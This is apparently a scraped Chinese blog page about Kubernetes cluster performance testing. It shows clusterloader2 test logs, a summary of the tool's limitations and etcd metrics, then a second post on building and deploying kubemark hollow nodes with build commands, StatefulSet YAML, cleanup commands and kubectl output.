api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource:status Verb:PATCH Scope:namespace Latency:{Perc50:3.777ms Perc90:13.656ms Perc99:173.072ms} Count:88}; threshold: 1s I1214 15:25:56.245966 96634 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource: Verb:GET Scope:namespace Latency:{Perc50:1.88ms Perc90:11.522ms Perc99:87.668ms} Count:156}; threshold: 1s I1214 15:25:56.821263 96634 resource_usage.go:124] ResourceUsageSummary: gathering resource usage... I1214 15:25:56.823909 96634 container_resource_gatherer.go:172] Closed stop channel. Waiting for 1 workers I1214 15:25:56.824075 96634 resource_gather_worker.go:90] Closing worker for node1 I1214 15:25:56.824118 96634 container_resource_gatherer.go:180] Waitgroup finished. I1214 15:25:56.824313 96634 system_pod_metrics.go:82] skipping collection of system pod metrics I1214 15:26:06.865304 96634 simple_test_executor.go:345] Resources cleanup time: 10.040658542s E1214 15:26:06.865325 96634 clusterloader.go:177] -------------------------------------------------------------------------------- E1214 15:26:06.865328 96634 clusterloader.go:178] Test Finished E1214 15:26:06.865330 96634 clusterloader.go:179] Test: /home/wangb/perf-test/clusterloader2/testing/density/config2.yaml E1214 15:26:06.865335 96634 clusterloader.go:180] Status: Fail E1214 15:26:06.865338 96634 clusterloader.go:182] Errors: [measurement call APIResponsiveness - APIResponsiveness error: top latency metric: there should be no high-latency requests, but: [got: {Resource:endpoints Subresource: Verb:PUT Scope:namespace Latency:{Perc50:2.65ms Perc90:22.594ms Perc99:1.122221s} Count:22}; expected perc99 \u0026lt;= 1s got: {Resource:namespaces Subresource: Verb:GET Scope:cluster Latency:{Perc50:11.99ms Perc90:1.005472s Perc99:1.084129s} Count:13}; expected perc99 \u0026lt;= 1s got: {Resource:nodes Subresource:status Verb:PATCH Scope:cluster Latency:{Perc50:1.00345s Perc90:1.00345s Perc99:1.00345s} Count:1}; expected perc99 \u0026lt;= 1s]] E1214 15:26:06.865341 96634 clusterloader.go:184] -------------------------------------------------------------------------------- F1214 15:26:06.866736 96634 clusterloader.go:276] 1 tests have failed!   由上看出，由于时延性能指标超过门限值1s，测试工具认为测试不通过。\n修改下 测试配置文件中的PODS_PER_NODE参数，由10改为2，负载变小，则测试通过\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  I1214 15:35:53.874477 111782 wait_for_controlled_pods.go:235] WaitForControlledPodsRunning: running 0, deleted 2, timeout: 0, unknown: 0 I1214 15:35:53.874751 111782 wait_for_controlled_pods.go:249] WaitForControlledPodsRunning: 0/0 ReplicationControllers are running with all pods I1214 15:35:53.874765 111782 simple_test_executor.go:128] Step \u0026#34;Deleting saturation pods\u0026#34; ended I1214 15:35:53.956315 111782 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:replicationcontrollers Subresource:status Verb:PUT Scope:namespace Latency:{Perc50:3.108ms Perc90:9.428ms Perc99:11.831ms} Count:11}; threshold: 1s I1214 15:35:53.956378 111782 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource:status Verb:PATCH Scope:namespace Latency:{Perc50:2.767ms Perc90:7.49ms Perc99:9.821ms} Count:21}; threshold: 1s I1214 15:35:53.956384 111782 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource: Verb:GET Scope:namespace Latency:{Perc50:1.797ms Perc90:5.05ms Perc99:9.388ms} Count:36}; threshold: 1s I1214 15:35:53.956388 111782 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource: Verb:POST Scope:namespace Latency:{Perc50:7.554ms Perc90:8.879ms Perc99:8.879ms} Count:4}; threshold: 1s I1214 15:35:53.956392 111782 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:services Subresource: Verb:GET Scope:namespace Latency:{Perc50:8.757ms Perc90:8.757ms Perc99:8.757ms} Count:1}; threshold: 1s I1214 15:35:54.364397 111782 resource_usage.go:124] ResourceUsageSummary: gathering resource usage... I1214 15:35:54.364444 111782 container_resource_gatherer.go:172] Closed stop channel. Waiting for 1 workers I1214 15:35:54.364648 111782 resource_gather_worker.go:90] Closing worker for node1 I1214 15:35:54.364655 111782 container_resource_gatherer.go:180] Waitgroup finished. I1214 15:35:54.366369 111782 system_pod_metrics.go:82] skipping collection of system pod metrics I1214 15:36:04.390697 111782 simple_test_executor.go:345] Resources cleanup time: 10.023892674s I1214 15:36:04.390750 111782 clusterloader.go:177] -------------------------------------------------------------------------------- I1214 15:36:04.390753 111782 clusterloader.go:178] Test Finished I1214 15:36:04.390756 111782 clusterloader.go:179] Test: /home/wangb/perf-test/clusterloader2/testing/density/config2.yaml I1214 15:36:04.390758 111782 clusterloader.go:180] Status: Success I1214 15:36:04.390760 111782 clusterloader.go:184] --------------------------------------------------------------------------------   7 总结  perf-test clusterloader2工具主要提供了性能压测，可配置性好，方便编写测试用例，并且统计了相应的性能指标 clusterloader2内置实现了k8s指标采集处理和指标阈值定义，参考文档：Kubernetes scalability and performance SLIs/SLOs clusterloader2没有详细的使用说明文档，目前来看不是可以拿来直接运行使用。所遇到问题一般只能依靠自己解决。 由于上面第3点，所遇问题较多，一般多涉及测试工具环境配置参数，另外clusterloader2对一些参数使用的是硬编码方式，导致无法直接使用原有工具，只能修改源码进行测试适配。 测试使用clusterloader2，需要详细了解其设计方案，才能运行测试用例 进行集群测试，需要了解集群测试指标定义，再编写测试配置 测试时需要预估下测试pod数量和内存占用情况，否则会引起OOM。 clusterloader2并不是一个拿来即用的测试工具，还需结合测试环境进行改造适配，更像是K8S内部使用的类似脚手架的东西  8 附录 参考命令\n批量删除k8s测试命名空间及其资源，这里测试数据默认使用了test-开头的命令规则\n1  kubectl get ns |grep test- |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete ns --force --grace-period=0   测试中如果出现异常，系统会残留有测试使用的资源参数，这里需要对实际情况进行调整\n测试完成后的测试资源清理（如果测试后有测试数据资源残留的话）：\n 测试ns、rc、pod清理 hollow-node 桩节点清理  K8S的SLI (服务等级指标) 和 SLO (服务等级目标) Kubernetes 社区提供了 SLI (服务等级指标) 和 SLO (服务等级目标) 系统性能测试、分析文档 Kubernetes scalability and performance SLIs/SLOs。模拟出一个 K8s cluster（Kubemark cluster），不受资源限制。cluster 中 master 是真实的机器，所有的 nodes 是 Hollow nodes。Hollow nodes 不会调用Docker，测试一套 K8s API 调用的完整流程，不会真正创建 pod。\n社区开发了 perf-test/clusterloader2，可配置性好，并且统计了相应的性能指标\nkubemark 不调用 CRI 接口之外，其它行为和 kubelet 基本一致\nEtcd监控指标 参考: https://github.com/coreos/etcd/blob/master/Documentation/metrics.md\n领导者相关 etcd_server_has_leader etcd是否有leader etcd_server_leader_changes_seen_total etcd的leader变换次数 etcd_debugging_mvcc_db_total_size_in_bytes 数据库的大小 process_resident_memory_bytes 进程驻留内存\n网络相关 grpc_server_started_total grpc(高性能、开源的通用RPC(远程过程调用)框架)服务器启动总数 etcd_network_client_grpc_received_bytes_total 接收到grpc客户端的字节总数 etcd_network_client_grpc_sent_bytes_total 发送给grpc客户端的字节总数 etcd_network_peer_received_bytes_total etcd网络对等方接收的字节总数(对等网络，即对等计算机网络，是一种在对等者（Peer）之间分配任务和工作负载的分布式应用架构，是对等计算模型在应用层形成的一种组网或网络形式) etcd_network_peer_sent_bytes_total etcd网络对等方发送的字节总数\n提案相关 etcd_server_proposals_failed_total 目前正在处理的提案(提交会议讨论决定的建议。)数量 etcd_server_proposals_pending 失败提案总数 etcd_server_proposals_committed_total 已落实共识提案的总数。 etcd_server_proposals_applied_total 已应用的共识提案总数。\n这些指标描述了磁盘操作的状态。 etcd_disk_backend_commit_duration_seconds_sum etcd磁盘后端提交持续时间秒数总和 etcd_disk_backend_commit_duration_seconds_bucket etcd磁盘后端提交持续时间\n快照 etcd_debugging_snap_save_total_duration_seconds_sum etcd快照保存用时\n文件 process_open_fds{service=\u0026ldquo;etcd-k8s\u0026rdquo;} 打开文件描述符的数量 process_max_fds{service=\u0026ldquo;etcd-k8s\u0026rdquo;} 打开文件描述符的最大数量 etcd_disk_wal_fsync_duration_seconds_sum Wal(预写日志系统)调用的fsync(将文件数据同步到硬盘)的延迟分布 etcd_disk_wal_fsync_duration_seconds_bucket 后端调用的提交的延迟分布\n参考文章\n  Kubernetes测试系列 - 性能测试\n  kubernetes性能指标体系：clusterloader2\n  clusterloader2的漫漫踩坑路：最详细解析与使用指南\n  clusterloader2设计说明：Cluster loader vision\n  etcd指标监控，参考文章\n ","permalink":"http://bingerambo.com/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/","tags":["K8S"],"title":"K8S集群性能测试-clusterloader"},{"categories":["K8S"],"contents":"了解如何使用kubemark对k8s组件进行性能测试\n1 背景 项目想对k8s组件进行集群性能测试。原有组件如调度器，已有的测试工具多是单元测试。需要寻找一种可以对k8s集群进行性能测试。比如多多节点大集群规模下的调度器性能指标如何？\n考虑使用k8s项目自带的性能测试组件kubemark。\n2 kubemark 介绍 kubemark 是 K8s 官方给出的性能测试工具，能够不受任何资源限制，模拟出一个大规模 K8s 集群。其主要架构如图所示:需要一个外部 K8s 集群（external cluster） 以及一个机器节点运行 kubemark master，即另外一个 K8s 集群，但是只有一个 master 节点。我们需要在 external cluster 中部署运行 hollow pod，这些 pod 会主动向 kubemark 集群注册，并成为 kubemark 集群中的 hollow node(虚拟节点)。然后我们就可以在 kubemark 集群中进行 e2e 测试。虽然与真实集群的稍微有点误差，不过可以代表真实集群的数据。\n  本文则只构造了kubemark组件，且只使用了测试集群，即外部 K8s 集群（external cluster），未使用第2个kubemark集群。目的为测试集群中的master组件，如调度器和控制器等。另外，此方式还可以自己使用第三方测试工具和框架\n  kubemark构造 1. 编译kubemark 在 K8s 源码路径下构建 kubemark，生成的二进制文件在 _output/bin 目录下。\n1 2 3  # KUBE_BUILD_PLATFORMS=linux/amd64 make kubemark GOFLAGS=-v GOGCFLAGS=\u0026#34;-N -l\u0026#34; make kubemark GOGCFLAGS=\u0026#34;-N -l\u0026#34;   2. 构建kubemark镜像 将生成的 kubemark 二进制文件从 _output/bin 复制到 cluster/images/kubemark 目录下。\n1  cp _output/bin/kubemark cluster/images/kubemark/   并在该目录下执行构建镜像命令，生成镜像：staging-registry.cn-hangzhou.aliyuncs.com/google_containers/kubemark:v1.14.8。\n1 2 3 4  # IMAGE_TAG=v1.14.3 make build cd cluster/images/kubemark/ IMAGE_TAG=v1.14.8 make build   3. 保存镜像至kubemark.tar 4. kubemark部署到测试集群 在测试集群中的所有node节点中，导入该kubemark镜像。用于启动桩节点。 接下来进行桩节点hollow-node启动配置操作\n1 2 3 4 5 6 7 8 9 10 11 12 13  # 以下命令在测试集群的master节点上执行 # 从kubemark-master节点（191节点）拷贝过来kubeconfig文件，到测试集群的master节点中 # scp -r 192.168.182.191:/root/.kube/config /home/wangb/ # 在测试集群master节点上执行 kubectl create ns kubemark kubectl create configmap node-configmap -n kubemark --from-literal=content.type=\u0026#34;test-cluster\u0026#34; # kubectl create secret generic kubeconfig --type=Opaque --namespace=kubemark --from-file=kubelet.kubeconfig=config --from-file=kubeproxy.kubeconfig=config kubectl create secret generic kubeconfig --type=Opaque --namespace=kubemark --from-file=kubelet.kubeconfig=/root/.kube/config --from-file=kubeproxy.kubeconfig=/root/.kube/config   5. 在测试集群中启动hollow nodes 1  kubectl create -f hollow-node-sts.yaml -n kubemark   清理kubemark 资源 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # delete hollow-node-sts kubectl delete -f hollow-node-sts.yaml NAMESPACE=kubemark kubectl get po -n $NAMESPACE |grep -E \u0026#34;Terminating|CrashLoopBackOff|Error\u0026#34; |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 NAMESPACE=kube-system kubectl get po -n $NAMESPACE |grep -E \u0026#34;ContainerCreating|Init:0/1|Pending\u0026#34; |grep -v \u0026#34;metrics-server\u0026#34;|awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 NAMESPACE=aistation kubectl get po -n $NAMESPACE |grep -E \u0026#34;ContainerCreating|Init:0/1|Pending\u0026#34; |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 #NAMESPACE=kubemark #kubectl delete ns $NAMESPACE --force --grace-period=0 # clear nodes kubectl get no |grep \u0026#34;hollow-node\u0026#34; |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete no --force --grace-period=0   测试pod 启动桩节点，hollow-node-sts.yaml的默认配置如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127  apiVersion:v1kind:Servicemetadata:name:hollow-nodenamespace:kubemarkspec:clusterIP:Noneports:- port:80protocol:TCPtargetPort:80selector:name:hollow-node---apiVersion:apps/v1kind:StatefulSetmetadata:name:hollow-nodenamespace:kubemarkspec:podManagementPolicy:Parallelreplicas:6selector:matchLabels:name:hollow-nodeserviceName:hollow-nodetemplate:metadata:labels:name:hollow-nodespec:initContainers:- name:init-inotify-limitimage:docker.io/busybox:latestimagePullPolicy:IfNotPresentcommand:[\u0026#39;sysctl\u0026#39;,\u0026#39;-w\u0026#39;,\u0026#39;fs.inotify.max_user_instances=200\u0026#39;]securityContext:privileged:truevolumes:- name:kubeconfig-volumesecret:secretName:kubeconfig- name:logs-volumehostPath:path:/var/logcontainers:- name:hollow-kubeletimage:staging-registry.cn-hangzhou.aliyuncs.com/google_containers/kubemark:v1.14.8imagePullPolicy:IfNotPresentports:- containerPort:4194- containerPort:10250- containerPort:10255env:- name:CONTENT_TYPEvalueFrom:configMapKeyRef:name:node-configmapkey:content.type- name:NODE_NAMEvalueFrom:fieldRef:fieldPath:metadata.namecommand:- /bin/sh- -c- /kubemark --morph=kubelet --name=$(NODE_NAME) --kubeconfig=/kubeconfig/kubelet.kubeconfig $(CONTENT_TYPE) --alsologtostderr --v=2volumeMounts:- name:kubeconfig-volumemountPath:/kubeconfigreadOnly:true- name:logs-volumemountPath:/var/logresources:requests:cpu:20mmemory:50MsecurityContext:privileged:true- name:hollow-proxyimage:staging-registry.cn-hangzhou.aliyuncs.com/google_containers/kubemark:v1.14.8imagePullPolicy:IfNotPresentenv:- name:CONTENT_TYPEvalueFrom:configMapKeyRef:name:node-configmapkey:content.type- name:NODE_NAMEvalueFrom:fieldRef:fieldPath:metadata.namecommand:- /bin/sh- -c- /kubemark --morph=proxy --name=$(NODE_NAME) --use-real-proxier=false --kubeconfig=/kubeconfig/kubeproxy.kubeconfig $(CONTENT_TYPE) --alsologtostderr --v=2volumeMounts:- name:kubeconfig-volumemountPath:/kubeconfigreadOnly:true- name:logs-volumemountPath:/var/logresources:requests:cpu:20mmemory:50Mtolerations:- effect:NoExecutekey:node.kubernetes.io/unreachableoperator:Exists- effect:NoExecutekey:node.kubernetes.io/not-readyoperator:Existsaffinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:# 硬策略nodeSelectorTerms:- matchExpressions:- key:nameoperator:NotInvalues:- hollow-node- key:node-role.kubernetes.io/masteroperator:NotInvalues:- \u0026#34;true\u0026#34;  由上可知，hollow-node实际上是启动过了kubelet和proxy的2个进程，后来分析源码确实如此。\n写个测试pod，验证桩node是否可用，test-pod.yaml如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  apiVersion:v1kind:Podmetadata:name:myapp-podlabels:app:myappversion:v1spec:containers:- name:appimage:docker.io/busybox:latestimagePullPolicy:IfNotPresentcommand:[\u0026#39;sleep\u0026#39;,\u0026#39;3600\u0026#39;]securityContext:privileged:trueaffinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:# 硬策略nodeSelectorTerms:- matchExpressions:- key:node-role.kubernetes.io/nodeoperator:NotInvalues:- \u0026#34;true\u0026#34;  节点信息 hollow-node-0, 此信息为默认信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  Name: hollow-node-0 Roles: \u0026lt;none\u0026gt; Labels: beta.kubernetes.io/arch=amd64 beta.kubernetes.io/os=linux kubernetes.io/arch=amd64 kubernetes.io/hostname=hollow-node-0 kubernetes.io/os=linux Annotations: node.alpha.kubernetes.io/ttl: 0 CreationTimestamp: Mon, 07 Dec 2020 17:25:15 +0800 Taints: \u0026lt;none\u0026gt; Unschedulable: false Conditions: Type Status LastHeartbeatTime LastTransitionTime Reason Message ---- ------ ----------------- ------------------ ------ ------- MemoryPressure False Tue, 08 Dec 2020 09:37:21 +0800 Mon, 07 Dec 2020 17:25:15 +0800 KubeletHasSufficientMemory kubelet has sufficient memory available DiskPressure False Tue, 08 Dec 2020 09:37:21 +0800 Mon, 07 Dec 2020 17:25:15 +0800 KubeletHasNoDiskPressure kubelet has no disk pressure PIDPressure False Tue, 08 Dec 2020 09:37:21 +0800 Mon, 07 Dec 2020 17:25:15 +0800 KubeletHasSufficientPID kubelet has sufficient PID available Ready True Tue, 08 Dec 2020 09:37:21 +0800 Mon, 07 Dec 2020 17:25:15 +0800 KubeletReady kubelet is posting ready status Addresses: InternalIP: 10.233.96.39 Hostname: hollow-node-0 Capacity: cpu: 1 ephemeral-storage: 0 memory: 3840Mi pods: 110 Allocatable: cpu: 1 ephemeral-storage: 0 memory: 3840Mi pods: 110 System Info: Machine ID: System UUID: Boot ID: Kernel Version: 3.16.0-0.bpo.4-amd64 OS Image: Debian GNU/Linux 7 (wheezy) Operating System: linux Architecture: amd64 Container Runtime Version: docker://1.13.1 Kubelet Version: v0.0.0-master+4d3c9e0c Kube-Proxy Version: v0.0.0-master+4d3c9e0c PodCIDR: 10.233.98.0/24 Non-terminated Pods: (3 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits AGE --------- ---- ------------ ---------- --------------- ------------- --- kube-system calico-node-29z7g 150m (15%) 300m (30%) 64M (1%) 500M (12%) 16h kube-system kube-proxy-8wcss 0 (0%) 0 (0%) 0 (0%) 0 (0%) 16h kube-system metrics-server-84d6dbd58b-6vqmf 50m (5%) 145m (14%) 125Mi (3%) 375Mi (9%) 16h   作业运行到hollow node\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81  [root@node1 .kube]# kubectl get po -A -owide NAMESPACE NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES default myapp-pod 1/1 Running 0 6s 10.94.251.209 hollow-node-1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-77l7w 0/1 Init:0/1 0 20m 10.233.96.20 hollow-node-3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-fhlsn 0/1 Init:0/1 0 20m 10.233.96.21 hollow-node-0 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-g9fx8 0/1 Init:0/1 0 20m 10.233.96.19 hollow-node-5 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-gdrlk 0/1 Init:0/1 0 20m 10.233.96.17 hollow-node-1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-lnzc7 0/1 Init:0/1 0 20m 10.233.96.22 hollow-node-4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-lt9jh 0/1 Init:0/1 0 20m 10.233.96.18 hollow-node-2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-ms5t6 1/1 Running 0 51m 192.168.182.102 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-vxcb7 1/1 Running 0 51m 192.168.182.101 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system coredns-654c8ccdc8-575qx 1/1 Running 0 53m 10.233.90.74 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system coredns-654c8ccdc8-m8ntn 0/1 Pending 0 174d \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system dns-autoscaler-77445c9c8b-b565h 1/1 Running 0 53m 10.233.90.65 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-apiserver-node1 1/1 Running 11 51m 192.168.182.101 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-controller-manager-node1 1/1 Running 11 51m 192.168.182.101 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-72xn7 0/1 ContainerCreating 0 20m 10.233.96.21 hollow-node-0 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-8jw9r 0/1 ContainerCreating 0 20m 10.233.96.19 hollow-node-5 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-92jzz 0/1 ContainerCreating 0 20m 10.233.96.20 hollow-node-3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-djxjg 0/1 ContainerCreating 0 20m 10.233.96.18 hollow-node-2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-dsghn 1/1 Running 0 51m 192.168.182.101 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-gjzq8 1/1 Running 0 51m 192.168.182.102 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-lpb8m 0/1 ContainerCreating 0 20m 10.233.96.17 hollow-node-1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-sfjlq 0/1 ContainerCreating 0 20m 10.233.96.22 hollow-node-4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-scheduler-node1 1/1 Running 11 51m 192.168.182.101 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system metrics-server-84d6dbd58b-rbrjd 0/2 ContainerCreating 0 20m \u0026lt;none\u0026gt; hollow-node-3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kubemark hollow-node-0 2/2 Running 0 20m 10.233.96.21 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kubemark hollow-node-1 2/2 Running 0 20m 10.233.96.17 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kubemark hollow-node-2 2/2 Running 0 20m 10.233.96.18 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kubemark hollow-node-3 2/2 Running 0 20m 10.233.96.20 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kubemark hollow-node-4 2/2 Running 0 20m 10.233.96.22 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kubemark hollow-node-5 2/2 Running 0 20m 10.233.96.19 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; [root@node1 .kube]# kubectl describe po -ndefault myapp-pod Name: myapp-pod Namespace: default Priority: 0 PriorityClassName: \u0026lt;none\u0026gt; Node: hollow-node-1/10.233.96.17 Start Time: Mon, 07 Dec 2020 16:33:50 +0800 Labels: app=myapp version=v1 Annotations: \u0026lt;none\u0026gt; Status: Running IP: 10.94.251.209 Containers: app: Container ID: docker://3033a0ef90209b22 Image: docker.io/busybox:latest Image ID: docker://docker.io/busybox:latest Port: \u0026lt;none\u0026gt; Host Port: \u0026lt;none\u0026gt; Command: sleep 3600 State: Running Started: Mon, 07 Dec 2020 16:33:54 +0800 Ready: True Restart Count: 0 Environment: \u0026lt;none\u0026gt; Mounts: /var/run/secrets/kubernetes.io/serviceaccount from default-token-fm7gj (ro) Conditions: Type Status Initialized True Ready True ContainersReady True PodScheduled True Volumes: default-token-fm7gj: Type: Secret (a volume populated by a Secret) SecretName: default-token-fm7gj Optional: false QoS Class: BestEffort Node-Selectors: \u0026lt;none\u0026gt; Tolerations: node.kubernetes.io/not-ready:NoExecute for 300s node.kubernetes.io/unreachable:NoExecute for 300s Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 17s default-scheduler Successfully assigned default/myapp-pod to hollow-node-1   上面的kubemark和测试hollow-node是缺省默认配置，无法满足项目的k8s测试需要，比如node的自定义资源描述等，所以还需对kubemark和测试hollow-node进行改造。\n修改kubemark（kubelet），重新编译kubemark，重新部署kubemark，查看桩节点信息（资源信息）如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70  Name: hollow-node-0 Roles: \u0026lt;none\u0026gt; Labels: beta.kubernetes.io/arch=amd64 beta.kubernetes.io/os=linux kubernetes.io/arch=amd64 kubernetes.io/hostname=hollow-node-0 kubernetes.io/os=linux Annotations: node.alpha.kubernetes.io/ttl: 0 CreationTimestamp: Tue, 08 Dec 2020 13:34:35 +0800 Taints: \u0026lt;none\u0026gt; Unschedulable: false Conditions: Type Status LastHeartbeatTime LastTransitionTime Reason Message ---- ------ ----------------- ------------------ ------ ------- MemoryPressure False Tue, 08 Dec 2020 13:34:35 +0800 Tue, 08 Dec 2020 13:34:35 +0800 KubeletHasSufficientMemory kubelet has sufficient memory available DiskPressure False Tue, 08 Dec 2020 13:34:35 +0800 Tue, 08 Dec 2020 13:34:35 +0800 KubeletHasNoDiskPressure kubelet has no disk pressure PIDPressure False Tue, 08 Dec 2020 13:34:35 +0800 Tue, 08 Dec 2020 13:34:35 +0800 KubeletHasSufficientPID kubelet has sufficient PID available Ready True Tue, 08 Dec 2020 13:34:35 +0800 Tue, 08 Dec 2020 13:34:35 +0800 KubeletReady kubelet is posting ready status Addresses: InternalIP: 10.233.96.50 Hostname: hollow-node-0 Capacity: cpu: 72 ephemeral-storage: 15726578Mi inspur.com/gpu: 99999 inspur.com/rdma-hca: 99999 memory: 256Gi nvidia.com/gpu: 8 pods: 110 Allocatable: cpu: 72 ephemeral-storage: 15726578Mi inspur.com/gpu: 99999 inspur.com/rdma-hca: 99999 memory: 256Gi nvidia.com/gpu: 8 pods: 110 System Info: Machine ID: System UUID: Boot ID: Kernel Version: 3.16.0-0.bpo.4-amd64 OS Image: Debian GNU/Linux 7 (wheezy) Operating System: linux Architecture: amd64 Container Runtime Version: docker://1.13.1 Kubelet Version: v0.0.0-master+4d3c9e0c Kube-Proxy Version: v0.0.0-master+4d3c9e0c PodCIDR: 10.233.67.0/24 Non-terminated Pods: (3 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits AGE --------- ---- ------------ ---------- --------------- ------------- --- kube-system calico-node-n5528 150m (0%) 300m (0%) 64M (0%) 500M (0%) 14s kube-system kube-proxy-fxcs4 0 (0%) 0 (0%) 0 (0%) 0 (0%) 14s kube-system metrics-server-84d6dbd58b-sx7sl 50m (0%) 145m (0%) 125Mi (0%) 375Mi (0%) 8s Allocated resources: (Total limits may be over 100 percent, i.e., overcommitted.) Resource Requests Limits -------- -------- ------ cpu 200m (0%) 445m (0%) memory 195072k (0%) 893216k (0%) ephemeral-storage 0 (0%) 0 (0%) inspur.com/gpu 0 0 inspur.com/rdma-hca 0 0 nvidia.com/gpu 0 0 Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Starting 16s kube-proxy, hollow-node-0 Starting kube-proxy.   然后再运行测试pod，pod定义如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  apiVersion:v1kind:Podmetadata:name:myapp-podlabels:app:myappversion:v1spec:containers:- name:appimage:docker.io/busybox:latestimagePullPolicy:IfNotPresentcommand:[\u0026#39;sleep\u0026#39;,\u0026#39;3600\u0026#39;]securityContext:privileged:trueresources:limits:cpu:\u0026#34;1\u0026#34;memory:\u0026#34;2Mi\u0026#34;nvidia.com/gpu:\u0026#34;1\u0026#34;requests:cpu:\u0026#34;1\u0026#34;memory:\u0026#34;2Mi\u0026#34;nvidia.com/gpu:\u0026#34;1\u0026#34;affinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:# 硬策略nodeSelectorTerms:- matchExpressions:- key:node-role.kubernetes.io/nodeoperator:NotInvalues:- \u0026#34;true\u0026#34;  运行测试pod后的集群信息如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  NAMESPACE NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES default myapp-pod 1/1 Running 0 15s 10.142.241.4 hollow-node-3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-6n95j 0/1 Init:0/1 0 14m 10.233.96.49 hollow-node-5 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-g5qlq 0/1 Init:0/1 0 14m 10.233.96.51 hollow-node-1 \u0026lt;none\u0026gt; 